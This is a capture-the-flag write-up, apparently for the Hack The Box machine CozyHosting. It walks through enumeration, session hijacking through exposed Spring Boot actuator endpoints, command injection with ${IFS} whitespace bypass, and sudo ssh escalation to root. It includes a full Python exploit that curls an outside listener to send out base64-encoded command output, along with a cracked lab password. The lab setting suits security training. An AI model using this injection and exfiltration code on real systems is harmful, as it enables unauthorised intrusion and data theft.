# CozyHosting

## Enumeration

### Nmap

```
sudo nmap -p22,80 -A -oA nmap 10.10.11.230
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-12 13:43 EDT
Nmap scan report for 10.10.11.230
Host is up (0.037s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 (96%), Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   36.24 ms 10.10.14.1
2   36.62 ms 10.10.11.230

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.26 seconds
```

### Wapalyzer

Wapalyzer detect it is `Java` application it could be SpringBoot framework as it is most popular one in Java

![](<../../.gitbook/assets/Pasted image 20230912195335.png>)

### FFUF Directory bruteforcing

```
 ffuf -u http://cozyhosting.htb/FUZZ -w /opt/SecLists/Discovery/Web-Content/spring-boot.txt -recursion -recursion-depth 3

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cozyhosting.htb/FUZZ
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/spring-boot.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 200, Size: 634, Words: 1, Lines: 1, Duration: 54ms]
    * FUZZ: actuator

[Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 96ms]
    * FUZZ: actuator/env/home

[Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 61ms]
    * FUZZ: actuator/env/path

[Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 66ms]
    * FUZZ: actuator/env/lang

[Status: 200, Size: 4957, Words: 120, Lines: 1, Duration: 117ms]
    * FUZZ: actuator/env

[Status: 200, Size: 9938, Words: 108, Lines: 1, Duration: 65ms]
    * FUZZ: actuator/mappings

[Status: 200, Size: 398, Words: 1, Lines: 1, Duration: 48ms]
    * FUZZ: actuator/sessions

[Status: 200, Size: 15, Words: 1, Lines: 1, Duration: 77ms]
    * FUZZ: actuator/health

[Status: 200, Size: 127224, Words: 542, Lines: 1, Duration: 65ms]
    * FUZZ: actuator/beans

:: Progress: [112/112] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

This found some intereting endpoints.

`Actuator` endpoints are debuging information for example `sessions` endpoints allows retrieval and deletion of user sessions from a Spring Session-backed session store. Requires a servlet-based web application that uses Spring Session.

Docs:

{% embed url="https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html" %}

<figure><img src="../../.gitbook/assets/Pasted image 20230912200340.png" alt=""><figcaption></figcaption></figure>

## Auth bypass

Stolen session allows accessing `/admin` endpoint

Request:

<pre class="language-http" data-line-numbers data-full-width="true"><code class="lang-http">GET /admin HTTP/1.1
Host: cozyhosting.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Cookie: <a data-footnote-ref href="#user-content-fn-1">JSESSIONID</a>=A51BB440D8F95FB64E56DE075783F95C
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
</code></pre>

<figure><img src="../../.gitbook/assets/Pasted image 20230912200923.png" alt=""><figcaption></figcaption></figure>

## Exploitation&#x20;

Admin dashboard allows `SSH` connection to previously configured hosts.

<figure><img src="../../.gitbook/assets/Pasted image 20230912201939.png" alt=""><figcaption></figcaption></figure>

By adding `;` username it throws error implying that is executed by bash directly.

<figure><img src="../../.gitbook/assets/Pasted image 20230912201801.png" alt=""><figcaption></figcaption></figure>

Some output can be extracted by using `$(command)` syntax.

<figure><img src="../../.gitbook/assets/Pasted image 20230912202301.png" alt=""><figcaption></figcaption></figure>

When trying to execute more complex command application throws error that `Username can't contain whitespaces`

<figure><img src="../../.gitbook/assets/Pasted image 20230912202408.png" alt=""><figcaption></figcaption></figure>

But this can be bypassed by using `${IFS}` shell variable as this stand for separator so command `$(ls${IFS}/)` results in valid command.

### Exploit

```python
import concurrent.futures
from threading import Thread
import requests
import cmd
from http.server import BaseHTTPRequestHandler, HTTPServer, ThreadingHTTPServer
import socketserver
import base64

IP='0.0.0.0'
PORT=8000
URL='http://cozyhosting.htb/executessh'
PROXY = {
        'http':'http://127.0.0.1:8080'
        }
COOKIES={'JSESSIONID':'B4CB94691CEF79C8F83C1C5505C0B230'}

def hatfuServer():
    webServer =  HTTPServer((IP, PORT), CatchServer)
    #webServer.serve_forever()
    def handle_request(webServer):
        with webServer:
            webServer.serve_forever()
    thread = Thread(target=handle_request, args=(webServer,))
    thread.daemon=True
    thread.start()
    return webServer


class CatchServer(BaseHTTPRequestHandler):
    def log_request(self, code):
        pass

    def do_GET(self):
        self.send_response(200, "A Chuj Ci w Dupe")
        self.send_header('Connection', 'Close')
        self.end_headers()
        #data = base64.b64decode(self.path.split('=')[1])
        data = self.path.split('=')[1]
        data = data + '=' * (len(data) % 4)
        data = base64.b64decode(data).decode().strip()

        print(data, flush=True)

    def do_POST(self):
        self.send_response(200, "A Chuj Ci w Dupe")
        self.send_header('Connection', 'Close')
        self.end_headers()
        data = self.path.split('=')[1]
        print(data, flush=True)

class Exploit(cmd.Cmd):
    prompt='> '

    def default(self, line):
        payload=line.replace(' ','${IFS}')
        r = requests.post(URL, data={'host': '127.0.0.1', 'username':';$(curl${IFS}http://10.10.14.156:8000/a?data='+f'$({payload}|base64));'}, proxies=PROXY, cookies=COOKIES)


try:
    webServer = hatfuServer()
    Exploit().cmdloop()
except KeyboardInterrupt:
    webServer.server_close()
    print('naura')
```

To make exploitation easier I wrote some exploit in python to automate code execution.

<figure><img src="../../.gitbook/assets/Pasted image 20230912230812.png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

In app directory there is `jar` source file. After unziping it and `grep'ing` files I found password and login.

<figure><img src="../../.gitbook/assets/Pasted image 20230912233035.png" alt=""><figcaption></figcaption></figure>

Database contained password hasehs of two users `kanderson` and `admin`

<figure><img src="../../.gitbook/assets/Pasted image 20230912233503.png" alt=""><figcaption></figcaption></figure>

`Admin` password is crackable.

```
admin:manchesterunited
```

This credential can be reused to login to `josh` account

## Root

<figure><img src="../../.gitbook/assets/Pasted image 20230912234110.png" alt=""><figcaption></figcaption></figure>

Josh user can run `ssh` binary with `root` permission. This can be exploited by gaining `root` shell

{% embed url="https://gtfobins.github.io/gtfobins/ssh/#sudo" %}

<figure><img src="../../.gitbook/assets/Pasted image 20230912234216.png" alt=""><figcaption></figcaption></figure>

[^1]: Default-spring-cookie-name             &#x20;
